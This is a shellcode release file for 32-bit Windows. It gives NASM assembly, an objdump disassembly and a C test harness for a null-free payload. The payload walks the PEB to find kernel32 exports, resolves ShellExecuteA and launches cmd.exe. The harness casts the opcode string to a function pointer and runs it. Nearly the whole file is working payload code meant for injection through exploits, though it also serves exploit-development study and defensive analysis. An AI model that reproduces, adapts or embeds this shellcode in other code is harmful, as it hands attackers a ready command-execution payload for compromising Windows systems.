/*

	# Title : Windows x86 ShellExecuteA(NULL,NULL,"cmd.exe",NULL,NULL,1) shellcode
	# Date : 22-06-2016
	# Author : Roziul Hasan Khan Shifat
	# Tested on : Windows 7,10 x86

*/


/*

section .text
	global _start
_start:
xor ecx,ecx
mov eax,[fs:ecx+0x30] ;EAX=PEB
mov eax,[eax+0xc] ;EAX=PEB->Ldr
mov esi,[eax+0x14] ;ESI=PEB->Ldr.InMemOrderModuleList
lodsd ; EAX=ntdll.dll
xchg eax,esi ;EAX=ESI , ESI=EAX
lodsd ; EAX=Third(kernel32)
mov ebx,[eax+0x10] ;PVOID Dllbase (base address)

;-------------------------------

mov edx,[ebx+0x3c] ;(kernel32.dll base address+0x3c)=DOS->e_lfanew
add edx,ebx ;(DOS->e_lfanew+kernel32.dll base address)=PE Header
mov edx,[edx+0x78] ;(PE Header+0x78)=DataDirectory->VirtualAddress
add edx,ebx ;(DataDirectory->VirtualAddress+kernel32.dll base address)=export table of kernel32.dll(IMAGE_EXPORT_DIRECTORY)
mov esi,[edx+0x20]; (IMAGE_EXPORT_DIRECTORY+0x20)=AddressOfNames
add esi,ebx ;ESI=(AddressOfNames+kernel32.dll base address)=kernel32 AddressOfNames
xor ecx,ecx
;-----------------------

Get_func:
inc ecx ;increment the ordinal
lodsd ;Get name offset
add eax,ebx ;(offset+kernel32.dll base adress)=Get function name
cmp dword [eax],0x50746547 ;GetP
jnz Get_func
cmp dword [eax+0x4],0x41636f72 ;rocA
jnz Get_func
cmp dword [eax+0x8],0x65726464 ;ddre
jnz Get_func

;---------------------

mov esi,[edx+0x24] ;(IMAGE_EXPORT_DIRECTORY+0x24) AddressOfNameOrdinals

add esi,ebx ;ESI=(AddressOfNameOrdinals+kernel32.dll)=AddressOfNameOrdinals of kernel32.dll

mov cx,[esi+ecx*2] ;CX=Number of Function
dec ecx
mov esi,[edx+0x1c] ; (IMAGE_EXPORT_DIRECTORY+0x1c)=AddressOfFunctions

add esi,ebx ;ESI=beginning of Address table
mov edx,[esi+ecx*4];EDX=Pointer(offset)
add edx,ebx ;Edx=GetProcAddress

;-----------------------------
xor esi,esi
mov esi,edx ;backup of GetProcAddress
xor edi,edi
mov edi,ebx
;--------------

;finding address of LoadLibraryA()
xor ecx,ecx
push ecx

push 0x41797261
push 0x7262694c
push 0x64616f4c

push esp
push ebx ;address of kernel32.dll

call edx

add esp,12
;-----------------
xor ecx,ecx
;finding address of ExitProcess
push 0x42737365
mov [esp+3],cl
push 0x636f7250
push 0x74697845
push esp
push edi
xor edi,edi
mov edi,eax
call esi

;----------------------------
add esp,12
;LoadLibraryA("shell32.dll")
xor ecx,ecx
push ecx
push 0x416c6c64
mov [esp+3],cl
push 0x2e32336c
push 0x6c656873

push esp
xor edx,edx
mov edx,edi ;Edx=LoadLibraryA
mov edi,eax ;edi=ExitProcess
call edx
add esp,11
;------------------

;finding address of ShellExecuteA()
xor ecx,ecx
push 0x42424241
mov [esp+1],cl

push 0x65747563
push 0x6578456c
push 0x6c656853

push esp
push eax

call esi
;-------------------
;ShellExecuteA(NULL,NULL,"cmd.exe",NULL,NULL,1);
add esp,13
xor ecx,ecx
push 0x41657865
mov [esp+3],cl
push 0x2e646d63

push esp
pop ecx


xor edx,edx
inc edx

push edx
xor edx,edx
push edx
push edx

push ecx
push edx
push edx

call eax

call edi

*/


/*

Disassembly of section .text:

00401000 <_start>:
  401000:	31 c9                	xor    %ecx,%ecx
  401002:	64 8b 41 30          	mov    %fs:0x30(%ecx),%eax
  401006:	8b 40 0c             	mov    0xc(%eax),%eax
  401009:	8b 70 14             	mov    0x14(%eax),%esi
  40100c:	ad                   	lods   %ds:(%esi),%eax
  40100d:	96                   	xchg   %eax,%esi
  40100e:	ad                   	lods   %ds:(%esi),%eax
  40100f:	8b 58 10             	mov    0x10(%eax),%ebx
  401012:	8b 53 3c             	mov    0x3c(%ebx),%edx
  401015:	01 da                	add    %ebx,%edx
  401017:	8b 52 78             	mov    0x78(%edx),%edx
  40101a:	01 da                	add    %ebx,%edx
  40101c:	8b 72 20             	mov    0x20(%edx),%esi
  40101f:	01 de                	add    %ebx,%esi
  401021:	31 c9                	xor    %ecx,%ecx

00401023 <Get_func>:
  401023:	41                   	inc    %ecx
  401024:	ad                   	lods   %ds:(%esi),%eax
  401025:	01 d8                	add    %ebx,%eax
  401027:	81 38 47 65 74 50    	cmpl   $0x50746547,(%eax)
  40102d:	75 f4                	jne    401023 <Get_func>
  40102f:	81 78 04 72 6f 63 41 	cmpl   $0x41636f72,0x4(%eax)
  401036:	75 eb                	jne    401023 <Get_func>
  401038:	81 78 08 64 64 72 65 	cmpl   $0x65726464,0x8(%eax)
  40103f:	75 e2                	jne    401023 <Get_func>
  401041:	8b 72 24             	mov    0x24(%edx),%esi
  401044:	01 de                	add    %ebx,%esi
  401046:	66 8b 0c 4e          	mov    (%esi,%ecx,2),%cx
  40104a:	49                   	dec    %ecx
  40104b:	8b 72 1c             	mov    0x1c(%edx),%esi
  40104e:	01 de                	add    %ebx,%esi
  401050:	8b 14 8e             	mov    (%esi,%ecx,4),%edx
  401053:	01 da                	add    %ebx,%edx
  401055:	31 f6                	xor    %esi,%esi
  401057:	89 d6                	mov    %edx,%esi
  401059:	31 ff                	xor    %edi,%edi
  40105b:	89 df                	mov    %ebx,%edi
  40105d:	31 c9                	xor    %ecx,%ecx
  40105f:	51                   	push   %ecx
  401060:	68 61 72 79 41       	push   $0x41797261
  401065:	68 4c 69 62 72       	push   $0x7262694c
  40106a:	68 4c 6f 61 64       	push   $0x64616f4c
  40106f:	54                   	push   %esp
  401070:	53                   	push   %ebx
  401071:	ff d2                	call   *%edx
  401073:	83 c4 0c             	add    $0xc,%esp
  401076:	31 c9                	xor    %ecx,%ecx
  401078:	68 65 73 73 42       	push   $0x42737365
  40107d:	88 4c 24 03          	mov    %cl,0x3(%esp)
  401081:	68 50 72 6f 63       	push   $0x636f7250
  401086:	68 45 78 69 74       	push   $0x74697845
  40108b:	54                   	push   %esp
  40108c:	57                   	push   %edi
  40108d:	31 ff                	xor    %edi,%edi
  40108f:	89 c7                	mov    %eax,%edi
  401091:	ff d6                	call   *%esi
  401093:	83 c4 0c             	add    $0xc,%esp
  401096:	31 c9                	xor    %ecx,%ecx
  401098:	51                   	push   %ecx
  401099:	68 64 6c 6c 41       	push   $0x416c6c64
  40109e:	88 4c 24 03          	mov    %cl,0x3(%esp)
  4010a2:	68 6c 33 32 2e       	push   $0x2e32336c
  4010a7:	68 73 68 65 6c       	push   $0x6c656873
  4010ac:	54                   	push   %esp
  4010ad:	31 d2                	xor    %edx,%edx
  4010af:	89 fa                	mov    %edi,%edx
  4010b1:	89 c7                	mov    %eax,%edi
  4010b3:	ff d2                	call   *%edx
  4010b5:	83 c4 0b             	add    $0xb,%esp
  4010b8:	31 c9                	xor    %ecx,%ecx
  4010ba:	68 41 42 42 42       	push   $0x42424241
  4010bf:	88 4c 24 01          	mov    %cl,0x1(%esp)
  4010c3:	68 63 75 74 65       	push   $0x65747563
  4010c8:	68 6c 45 78 65       	push   $0x6578456c
  4010cd:	68 53 68 65 6c       	push   $0x6c656853
  4010d2:	54                   	push   %esp
  4010d3:	50                   	push   %eax
  4010d4:	ff d6                	call   *%esi
  4010d6:	83 c4 0d             	add    $0xd,%esp
  4010d9:	31 c9                	xor    %ecx,%ecx
  4010db:	68 65 78 65 41       	push   $0x41657865
  4010e0:	88 4c 24 03          	mov    %cl,0x3(%esp)
  4010e4:	68 63 6d 64 2e       	push   $0x2e646d63
  4010e9:	54                   	push   %esp
  4010ea:	59                   	pop    %ecx
  4010eb:	31 d2                	xor    %edx,%edx
  4010ed:	42                   	inc    %edx
  4010ee:	52                   	push   %edx
  4010ef:	31 d2                	xor    %edx,%edx
  4010f1:	52                   	push   %edx
  4010f2:	52                   	push   %edx
  4010f3:	51                   	push   %ecx
  4010f4:	52                   	push   %edx
  4010f5:	52                   	push   %edx
  4010f6:	ff d0                	call   *%eax
  4010f8:	ff d7                	call   *%edi

*/


#include<stdio.h>
#include<string.h>
char shellcode[]=\

"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xf6\x89\xd6\x31\xff\x89\xdf\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\x0c\x31\xc9\x68\x65\x73\x73\x42\x88\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x57\x31\xff\x89\xc7\xff\xd6\x83\xc4\x0c\x31\xc9\x51\x68\x64\x6c\x6c\x41\x88\x4c\x24\x03\x68\x6c\x33\x32\x2e\x68\x73\x68\x65\x6c\x54\x31\xd2\x89\xfa\x89\xc7\xff\xd2\x83\xc4\x0b\x31\xc9\x68\x41\x42\x42\x42\x88\x4c\x24\x01\x68\x63\x75\x74\x65\x68\x6c\x45\x78\x65\x68\x53\x68\x65\x6c\x54\x50\xff\xd6\x83\xc4\x0d\x31\xc9\x68\x65\x78\x65\x41\x88\x4c\x24\x03\x68\x63\x6d\x64\x2e\x54\x59\x31\xd2\x42\x52\x31\xd2\x52\x52\x51\x52\x52\xff\xd0\xff\xd7";

main()
{
printf("shellcode length %ld\n",(long)strlen(shellcode));
(* (int(*)()) shellcode) ();
}